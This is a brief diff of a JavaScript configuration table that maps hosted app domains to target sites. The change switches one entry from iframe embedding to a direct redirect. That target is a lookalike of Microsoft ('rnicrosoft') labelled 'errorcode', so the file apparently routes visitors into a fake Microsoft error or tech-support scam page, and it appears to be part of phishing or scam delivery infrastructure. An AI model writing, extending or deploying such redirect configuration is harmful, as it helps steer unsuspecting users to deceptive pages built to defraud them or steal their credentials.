@@ -95,7 +95,7 @@ const ORIGIN_GROUPS = {
     "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
   },
   aomine: {
-    "https://staging.d38r0fqdz8kjft.amplifyapp.com": { method: "iframe", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
+    "https://staging.d38r0fqdz8kjft.amplifyapp.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
   },
 };
 
